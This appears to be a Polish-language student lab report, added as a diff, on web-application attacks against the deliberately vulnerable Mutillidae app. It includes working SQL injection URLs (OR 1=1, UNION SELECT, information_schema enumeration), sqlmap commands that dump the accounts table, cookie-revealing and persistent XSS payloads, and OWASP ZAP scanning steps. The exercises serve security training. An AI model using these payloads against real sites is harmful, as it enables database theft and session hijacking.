@@ -1,0 +1,72 @@
+SQL Injection
+1. Wyświetl zawartość tabeli z użytkownikami.
+http://192.168.44.128/mutillidae/index.php?page=user-info.php&username=yolo&password=asd'%20OR%201=1--'&user-info-php-submit-button=View+Account+Details
+Komentarz: wykorzystujemy sztuczkę z "or 1 = 1", redukujący wykonywane polecenie do select * from accounts
+Ważny jest symbol --, komentujący resztę tekstu po wstrzykniętym sqlu, by uniknąć syntax error po stronie serwera wykonującego komendę.
+
+Wyświetl wersję bazy danych.
+http://192.168.44.128/mutillidae/index.php?page=user-info.php&username=yolo&password=asd'%20OR%201=1 union select 1,Version(),2,3,4 --'&user-info-php-submit-button=View+Account+Details
+Komentarz: Ponieważ mysql nie obsługuje "batch queries", exploitujemy sztuczkę z union. Żeby to zadziałało, ilość kolumn musi się zgadzać w obu poleceniach select, z tym że mamy narzucone 5 kolumn od 
+zapytania o accounts, dlatego dokonujemy "padding" 4 stałymi kolumnami.
+
+
+Wyświetl informację o innych tabelach w bazie.
+http://192.168.44.128/mutillidae/index.php?page=user-info.php&username='union%20(select%201,table_name,2,3,4%20from%20information_schema.tables) -- '&user-info-php-submit-button=View+Account+Details
+
+Wyświetl zawartość innej tabeli.
+http://192.168.44.128/mutillidae/index.php?page=user-info.php&username='union%20(select%20*,1%20from%20blogs_table) -- '&user-info-php-submit-button=View+Account+Details
+http://192.168.44.128/mutillidae/index.php?page=user-info.php&username=yolo&password=asd'%20OR%201=1 limit 0 union (select *,1 from blogs_table where blogger_name="adrian") -- '&user-info-php-submit-button=View+Account+Details
+Komentarz: Pierwszy select wypisuje zawartość tabeli blogs_table, drugi zawartość tej samej tabeli 
+
+Wykonaj zadanie w poziomie zabezpieczeń "5 (Secure)"
+Próbowałem wykonać powyższe injecty z tą samą zawartością payloadów, zweryfikowałem że secure 5 zasługuje na swoją nazwę (nie da się wypisać danych tymi sztuczkami).
+
+=============================================================================
+sqlmap
+
+Powtórz wcześniejsze punkty z użyciem komendy sqlmap. Początkowo musisz wykorzystać parametr -u i --forms. Dla przyspieszenia działania, można założyć znajomość bazy danych (--dbms) oraz pól, które są podatne na SQLi (-p).
+Na początku warto przeprowadzić weryfikację podatności pól na SQLi. W tym celu należy podać tylko parametry wymienione w poprzednim punkcie.
+Samo wykorzystanie SQLi do pobrania odpowiednich danych można realizować dodając do wcześniejszej linii poleceń odpowiednie parametry. sqlmap powinno załadować rezultaty wcześniejszych skanowań.
+
+python sqlmap.py -u "http://192.168.44.128/mutillidae/index.php?page=user-info.php" --forms --dbms mysql -p username 
+
+1. Wyświetl zawartość tabeli z użytkownikami.
+python sqlmap.py -u "http://192.168.44.128/mutillidae/index.php?page=user-info.php" --forms --dbms mysql -p username --dump -T accounts
+
+2. Wyświetl wersję bazy danych.
+python sqlmap.py -u "http://192.168.44.128/mutillidae/index.php?page=user-info.php" --forms --dbms mysql -p username --sql-query "select version()" 
+zamiast opcji --sql-query można użyć --banner
+
+3. Wyświetl informację o innych tabelach w bazie.
+python sqlmap.py -u "http://192.168.44.128/mutillidae/index.php?page=user-info.php" --forms --dbms mysql -p username --tables
+
+4. Wyświetl zawartość innej tabeli.
+python sqlmap.py -u "http://192.168.44.128/mutillidae/index.php?page=user-info.php" --forms --dbms mysql -p username --dump -T blogs_table
+
+==============================================================================
+Wykonaj jeden XSS typu reflected i jeden typu persistent.
+a) Reflected 
+wybieramy OWASP Top 10 > A2 - Cross site scripting (XSS) > Reflected(First order) > DNS Lookup
+w polu DNS lookup wpisujemy np.
+<script>alert("Hello")</script> - popup z alertem "Hello"
+<script>alert(document.cookie)</script> - popup pokazujący ciasteczko
+<img src = "http://ocdn.eu/pulscms-transforms/1/e1JktkpTURBXy9lNDZmMmM2ZGRmZDgxYzRlMjhjZjQ5MGVmYzE2ZmRhYS5qcGeRkwIAzQHk"> - pokazuje zdjęcie kota w kasku ze skórki pamelo
+
+b) Persisted 
+wybieramy OWASP Top 10 > A2 - Cross site scripting (XSS) > Persisted(Second order) > Add to your blog
+w polu blog wpisujemy
+ <iframe src="http://www.interia.pl/"></iframe>
+ klikamy save blog entry
+ każdemu kto kliknie w ramkę pojawiającą się jako zawartość bloga, zostanie przesłany skrypt przekierowujący na stronę główną interii.
+==============================================================================
+OWASP ZAP
+
+Uruchom z menu OWASP ZAP. Przy uruchamianiu wybierz zapisywanie sesji w wybranym miejscu, tak aby łatwo wrócić do pracy w przypadku potrzeby restartu maszyny.
+Skonfiguruj Firefoksa do korzystania z proxy OWASP ZAP (127.0.0.1:8080).
+Otwórz aplikację Mutillidae w przeglądarce. Zweryfikuj, że odwiedzane adresy pojawiają się w OWASP ZAP. Oznacz Mutillidae jako domyślny kontekst.
+Wybierz Attack / Spider dla Mutillidae. Uruchom skanowanie rekursywnie z ograniczeniem do poddrzewa.
+Przejrzyj wyniki skanowania oraz alerty.
+Włącz Attack / Active attack. Uruchom skanowanie rekursywne. W opcjach zaawansowanych wyłącz technologie, które na pewno nie mają znaczenia w tym wypadku. Zwiększ też Default Attack Strength w zakładce Policy.
+Skanowanie może trwać długo. W dowolnym momencie możesz przeskoczyć aktualny skan klikając na Show scan progress details.
+Czy znalezione zostały jakieś interesujące alerty?
+Wykorzystaj mechanizm edycji i powtarzania zapytań aby przetestować dowolne podatności pól w formularzach przesyłanych przez POST.
